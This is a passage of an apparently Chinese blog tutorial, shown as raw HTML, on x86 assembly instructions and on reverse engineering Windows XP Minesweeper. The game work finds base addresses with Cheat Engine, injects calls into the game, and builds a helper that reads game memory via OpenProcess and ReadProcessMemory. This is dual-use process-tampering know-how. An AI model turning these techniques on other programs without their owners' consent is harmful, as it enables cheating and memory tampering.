class=\"line\">\t\t\tmov al,[edi-2]</span><br><span class=\"line\">\t\t\tmov dl,[esi-2]</span><br><span class=\"line\">\t\t\tsub eax,edx</span><br><span class=\"line\">\t\t\tpop edx</span><br><span class=\"line\">\t\t\tpop esi</span><br><span class=\"line\">\t\t\tpop edi</span><br><span class=\"line\">\t\t\tpop ecx </span><br><span class=\"line\">\t\t\tpop ebp</span><br><span class=\"line\">\t\t\tretn</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ESP+4 是 call 的下一个命令的地址</p>\n<p>ESP+8 是外部传进来的第一个变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126203249743.png\" alt=\"image-20221126203249743\"></p>\n<p>STD/CLD</p>\n<p>修改 DF</p>\n<p>STD DF=1</p>\n<p>CLD DF=0</p>\n<p>串存储和加载指令</p>\n<p>1. 串存储指令 STOSB STOSW  STOSD</p>\n<p>stos btye ptr [edi]</p>\n<p>相当于 mov byte ptr [edi],al</p>\n<p>rep stosb     //rep stos byte ptr [edi]</p>\n<p>用 al 的值填充 byte ptr [edi]，每次 ecx-1，edi+1</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#include &lt;cstdio&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int main() </span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint a[0x22];</span><br><span class=\"line\">\ta[0] = 1;</span><br><span class=\"line\">\ta[0x12] = 222;</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013F13A0    55              push    ebp</span><br><span class=\"line\">013F13A1    8BEC            mov     ebp,esp</span><br><span class=\"line\">013F13A3    81EC 50010000   sub     esp,0x150</span><br><span class=\"line\">013F13A9    53              push    ebx</span><br><span class=\"line\">013F13AA    56              push    esi</span><br><span class=\"line\">013F13AB    57              push    edi</span><br><span class=\"line\">013F13AC    8DBD B0FEFFFF   lea     edi,dword ptr ss:[ebp-0x150]</span><br><span class=\"line\">013F13B2    B9 54000000     mov     ecx,0x54</span><br><span class=\"line\">013F13B7    B8 CCCCCCCC     mov     eax,0xCCCCCCCC</span><br><span class=\"line\">013F13BC    F3:AB           rep     stos dword ptr es:[edi]</span><br><span class=\"line\">013F13BE    C785 74FFFFFF 0&gt;mov     dword ptr ss:[ebp-0x8C],0x1</span><br><span class=\"line\">013F13C8    C745 BC DE00000&gt;mov     dword ptr ss:[ebp-0x44],0xDE</span><br><span class=\"line\">013F13CF    33C0            xor     eax,eax</span><br><span class=\"line\">013F13D1    52              push    edx</span><br><span class=\"line\">013F13D2    8BCD            mov     ecx,ebp</span><br><span class=\"line\">013F13D4    50              push    eax</span><br><span class=\"line\">013F13D5    8D15 EC133F01   lea     edx,dword ptr ds:[0x13F13EC]</span><br><span class=\"line\">013F13DB    E8 A7FCFFFF     call    013F1087</span><br></pre></td></tr></table></figure>\n<p>手动初始化数组</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">__asm &#123;</span><br><span class=\"line\">\tmov ecx,0x22</span><br><span class=\"line\">\txor eax,eax</span><br><span class=\"line\">\tlea edi,a</span><br><span class=\"line\">\trep stosd</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>debug 找 main 函数</p>\n<p>退出函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">013F199F    FF15 7C823F01   call    dword ptr ds:[&lt;&amp;MSVCR90D.exit&gt;]                      ; msvcr90d.exit</span><br></pre></td></tr></table></figure>\n<p>退出函数的上一个函数即使 main 函数</p>\n<p>release 中程序中断位置不在 main 上，在 jmp 上才时 main</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126213639997.png\" alt=\"image-20221126213639997\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221126213710284.png\" alt=\"image-20221126213710284\"></p>\n<p>看 exit 找 main 或者看 main 的 argv ，argc 参数找 main 也可以</p>\n<p>这边没删 pdb，删了一样</p>\n<p>同时注意，main 有三个参数，argv 参数个数，argc 参数数组，envp 环境变量</p>\n<p>envp 是二级指针，需要两次寻址，存放系统环境变量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190321276.png\" alt=\"image-20221127190321276\"></p>\n<p>argv 也是二级指针，存在文件路径</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190413354.png\" alt=\"image-20221127190413354\"></p>\n<p>argc 存放 argv 中参数个数</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127190503930.png\" alt=\"image-20221127190503930\"></p>\n<p>串载入指令</p>\n<blockquote>\n<p>loadSB ,LOADSW,LOASSD</p>\n<p>相当于 mov al,byte ptr [esi] 将内存中数据放到寄存器中</p>\n<p>rep loadsb</p>\n<p>rep loads word ptr [esi]</p>\n<p>用 byte ptr [esi] 填充 al，每次 ecx-1，esi+1</p>\n</blockquote>\n<p>循环控制指令</p>\n<blockquote>\n<p>loop start</p>\n<p>1.ecx-1</p>\n<p>2.ecx！=0 转移到标号处循环执行</p>\n<p>3. 直至 ecx=0</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int _tmain(int argc, _TCHAR* argv[])</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tint i = 100;</span><br><span class=\"line\">\tchar *s = &quot;%d&quot;;</span><br><span class=\"line\">\t__asm mov ecx,i</span><br><span class=\"line\"></span><br><span class=\"line\">\t__asm &#123;</span><br><span class=\"line\">start:</span><br><span class=\"line\">\t\tpush ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpush ecx</span><br><span class=\"line\">\t\tmov eax,s</span><br><span class=\"line\">\t\tpush eax</span><br><span class=\"line\">\t\tcall dword ptr [printf]</span><br><span class=\"line\">\t\tadd esp,8</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tpop ecx</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tloop start</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tgetchar();</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</blockquote>\n<p>条件置位指令</p>\n<blockquote>\n<p>sete  setz</p>\n<p>sete al  取 zf 标志位的值</p>\n<p>setnz 、 setne</p>\n<p>将 zf 的值取反保存</p>\n<p>setg al</p>\n<p>大于比较时 ZF =0&amp;&amp; sf=0 &amp;&amp; OF=1 时 al=1</p>\n<p>setl al</p>\n<p>小于比较</p>\n<p>sf=1 || of=1 ，al=1</p>\n<p>setge</p>\n<p>操作数可以是一个字节存储单元，可以是一个字节宽度寄存器</p>\n<p>&gt;= 时，操作数值 1，否则为 0，一般与 cmp 结合使用</p>\n<p>SF=OF ，操作数置 1</p>\n<p>setle</p>\n<p>操作数可以是一个字节存储单元，可以是一个字节宽度寄存器</p>\n<p>&lt;= 时，操作数值 1，否则为 0，一般与 cmp 结合使用</p>\n<p>ZF = 1 || sf!= of 操作数置 1</p>\n</blockquote>\n<h2 id=\"实战\"><a class=\"markdownIt-Anchor\" href=\"#实战\">#</a> 实战</h2>\n<h3 id=\"1游戏call\"><a class=\"markdownIt-Anchor\" href=\"#1游戏call\">#</a> 1. 游戏 call</h3>\n<blockquote>\n<p>调用 MessageBoxA 函数 call</p>\n<p>1. 找到 messageboxA call 地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">76C4FD1E &gt;  8BFF            mov     edi,edi</span><br></pre></td></tr></table></figure>\n<p>2. 找到 MessageBoxA call 参数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int MessageBox(</span><br><span class=\"line\">[in, optional] HWND    hWnd,</span><br><span class=\"line\">[in, optional] LPCTSTR lpText,</span><br><span class=\"line\">[in, optional] LPCTSTR lpCaption,</span><br><span class=\"line\">[in]           UINT    uType</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">我们用四个push 0，因为都可以传0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br></pre></td></tr></table></figure>\n<p>3. 注入代码测试调用 MessageBoxA call</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127205600961.png\" alt=\"image-20221127205600961\"></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127205625663.png\" alt=\"image-20221127205625663\"></p>\n<p>或者在第二个和第三个参数传入字符指针，，第一个参数改变窗口格式</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0</span><br><span class=\"line\">push 01005148</span><br><span class=\"line\">push 01005148</span><br><span class=\"line\">push 0</span><br><span class=\"line\">call 76C4FD1E</span><br></pre></td></tr></table></figure>\n<p>2. 窗口菜单类 call 分析</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127212738634.png\" alt=\"image-20221127212738634\"></p>\n<p>follow poc，定位窗口处理函数位置</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221127214017807.png\" alt=\"image-20221127214017807\"></p>\n<p>窗口处理函数原型</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LRESULT CALLBACK WindowProc(</span><br><span class=\"line\">HWND hwnd, </span><br><span class=\"line\">UINT uMsg, </span><br><span class=\"line\">WPARAM wParam, </span><br><span class=\"line\">LPARAM lParam </span><br><span class=\"line\">); </span><br></pre></td></tr></table></figure>\n<p>菜单被点击的时候发送的是 WM_COMMAND 消息</p>\n<p>当点击菜单的时候，WindowProc 会被系统调用，</p>\n<p>uMsg = WM_COMMAND</p>\n<p>wPARAM = 窗口菜单的 id</p>\n<p>在 WindowProc 函数下条件断点</p>\n<p>条件时：uMSG == WM_COMMAND</p>\n<p>如  edx == WM_COMMAND 条件断点</p>\n<p>点击菜单时条件断点被中断</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128192802977.png\" alt=\"image-20221128192802977\"></p>\n<p>点击初级时 edx == VMCOMMAND == 0x111</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">01001BC9  /.  55            push    ebp</span><br><span class=\"line\">01001BCA  |.  8BEC          mov     ebp,esp</span><br><span class=\"line\">01001BCC  |.  83EC 40       sub     esp,0x40</span><br><span class=\"line\">01001BCF  |.  8B55 0C       mov     edx,[arg.2]   ; uMsg</span><br><span class=\"line\">01001BD2 &gt;|.  8B4D 14       mov     ecx,[arg.4]   ; edx == WM_COMMAND</span><br><span class=\"line\">01001BD5  |.  53            push    ebx</span><br><span class=\"line\">01001BD6  |.  56            push    esi</span><br><span class=\"line\">01001BD7  |.  33DB          xor     ebx,ebx</span><br><span class=\"line\">01001BD9  |.  57            push    edi</span><br></pre></td></tr></table></figure>\n<p>分析出各项菜单被点击时四个参数的值</p>\n<p>wParam（菜单 ID）参数：</p>\n<p>​\t初级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C   HWND hwnd</span><br><span class=\"line\">EBP+C    &gt;|00000111   uMsg</span><br><span class=\"line\">EBP+10   &gt;|00000209   wParam</span><br><span class=\"line\">EBP+14   &gt;|00000000   lParam</span><br></pre></td></tr></table></figure>\n<p>​\t中级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C</span><br><span class=\"line\">EBP+C    &gt;|00000111</span><br><span class=\"line\">EBP+10   &gt;|0000020A</span><br><span class=\"line\">EBP+14   &gt;|00000000</span><br></pre></td></tr></table></figure>\n<p>​\t高级菜单 ID：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">EBP+8    &gt;|0011029C</span><br><span class=\"line\">EBP+C    &gt;|00000111</span><br><span class=\"line\">EBP+10   &gt;|0000020B</span><br><span class=\"line\">EBP+14   &gt;|00000000</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128194129162.png\" alt=\"image-20221128194129162\"></p>\n<p>注入代码调试</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push 0</span><br><span class=\"line\">push 0x20b</span><br><span class=\"line\">push 0x111</span><br><span class=\"line\">push 0x001A03DA</span><br><span class=\"line\">call 0x01001BC9</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128204020367.png\" alt=\"image-20221128204020367\"></p>\n</blockquote>\n<h3 id=\"2分析游戏基地址\"><a class=\"markdownIt-Anchor\" href=\"#2分析游戏基地址\">#</a> 2. 分析游戏基地址</h3>\n<blockquote>\n<p>基地址概念</p>\n<p>全局变量，字符常量等的地址</p>\n<p>1. 使用 CE 内存查找工具查找数据的地址</p>\n<p>2. 在 od 中验证是否为基地址</p>\n<p>​\t通过下内存断点方式验证</p>\n<p>通过 ce 找到基地址，new scan 后改变数值进行 next scan</p>\n<p>1. 首次先让要查找的数据稳定在某个范围 (或者某个精确的值)</p>\n<p>2. 改变要查找的数据，根据变化筛选出数据的地址</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221128205517107.png\" alt=\"image-20221128205517107\"></p>\n<p>在扫雷中，小旗子剩余数量的基地址为 01005194</p>\n <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0100346E  |.  0105 94510001 add     dword ptr ds:[0x1005194],eax</span><br></pre></td></tr></table></figure>\n<p>立即数寻址的一般都是基地址</p>\n</blockquote>\n<h3 id=\"3游戏菜单点击与读取基地址\"><a class=\"markdownIt-Anchor\" href=\"#3游戏菜单点击与读取基地址\">#</a> 3. 游戏菜单点击与读取基地址</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void CsaoleiDlg::OnBnClickedButton1()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20A, 0);  //发送WindowProc的参数</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton2()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\tHWND hwnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hwnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t::SendMessage(hwnd, WM_COMMAND, 0x20B, 0);  //发送WindowProc的参数</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton3()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\twhile (TRUE)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tOnBnClickedButton1();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t\tOnBnClickedButton2();</span><br><span class=\"line\">\t\tSleep(1000);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">void CsaoleiDlg::OnBnClickedButton4()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t// TODO: 在此添加控件通知处理程序代码</span><br><span class=\"line\">\t\t/*</span><br><span class=\"line\">\tBOOL ReadProcessMemory(</span><br><span class=\"line\">\t  HANDLE hProcess,</span><br><span class=\"line\">\t  LPCVOID lpBaseAddress,</span><br><span class=\"line\">\t  LPVOID lpBuffer,</span><br><span class=\"line\">\t  DWORD nSize,</span><br><span class=\"line\">\t  LPDWORD lpNumberOfBytesRead</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE OpenProcess( </span><br><span class=\"line\">\t  DWORD fdwAccess, </span><br><span class=\"line\">\t  BOOL fInherit, </span><br><span class=\"line\">\t  DWORD IDProcess</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tDWORD GetWindowThreadProcessId(</span><br><span class=\"line\">\t  HWND hWnd,</span><br><span class=\"line\">\t  LPDWORD lpdwProcessId</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\t*/</span><br><span class=\"line\">\tDWORD pid;</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(NULL, _T(&quot;扫雷&quot;));   //找到扫雷窗口</span><br><span class=\"line\">\tif (NULL == hWnd)    //处理未找到时操作</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tGetWindowThreadProcessId(hWnd, &amp;pid);  //通过窗口句柄拿到进程ID</span><br><span class=\"line\">\tHANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);  //通过进程ID拿到进程句柄</span><br><span class=\"line\">\tif (NULL == hProcess)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t::MessageBox(NULL, _T(&quot;未打开&quot;), _T(&quot;错误&quot;), MB_OK);</span><br><span class=\"line\">\t\treturn;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t//m_editbase1 是编辑框的绑定变量，类别为value，变量类型为int，变量名为m_editbase1</span><br><span class=\"line\">\tReadProcessMemory(hProcess, (LPCVOID)0x1005194, &amp;m_editbase1, sizeof(m_editbase1), &amp;pid);</span><br><span class=\"line\"></span><br><span class=\"line\">\tUpdateData(FALSE);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221130104547356.png\" alt=\"image-20221130104547356\"></p>\n<h3 id=\"4扫雷游戏辅助编写\"><a class=\"markdownIt-Anchor\" href=\"#4扫雷游戏辅助编写\">#</a> 4. 扫雷游戏辅助编写</h3>\n<blockquote>\n<p>1. 雷区数据分析</p>\n<p>中级 char a [24][32]  //ReadProcessMemory</p>\n<p>数据雷区基地址 0x01005361    ==  扫雷.exe+5361</p>\n<p>找基地址：new scan 时使用未知数，之后每一次 next scan 根据 change 或者 unchange 进行 next scan</p>\n<p>初级 9*9 ，内存中隔行存放，因为每一行占两行内存，10 代表结束</p>\n<p>只有点击第一下之后才开始布雷，winxp 扫雷特性</p>\n<p>0x8F 是雷，40 空白，40 对应 1，0x10 代表行 / 列结束标识</p>\n<p>宽基地址 0x01005334</p>\n<p>高基地址 0x01005338</p>\n</blockquote>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221130111727184.png\" alt=\"image-20221130111727184\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span 